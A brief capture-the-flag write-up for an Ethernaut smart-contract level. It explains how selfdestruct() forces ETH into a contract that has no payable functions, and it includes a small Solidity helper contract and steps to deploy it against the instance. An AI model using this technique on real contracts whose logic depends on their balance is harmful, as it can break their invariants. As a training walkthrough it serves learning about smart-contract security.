-Usually, smart contracts reject ETH unless there's a receive() or fallback() function marked as payable.
But ETH can still be forced into a contract using the selfdestruct() method from another contract.

-The vulnerable contract has no way to receive ETH since there are no payable functions.
 But selfdestruct() in the EVM allows ETH to be sent directly to any address.
 Once ETH is received, the condition is satisfied.

 -Helper contract
 ```
 contract SelfDestruct {
    constructor() payable {} 

    function boom(address payable target) external {
        selfdestruct(target);
    }
}
```

-We can deploy the contract by passing value and pass the ethernaut instance address as parameter

- We can check the contract balance and the balance should be more than 0

- Submit the instance

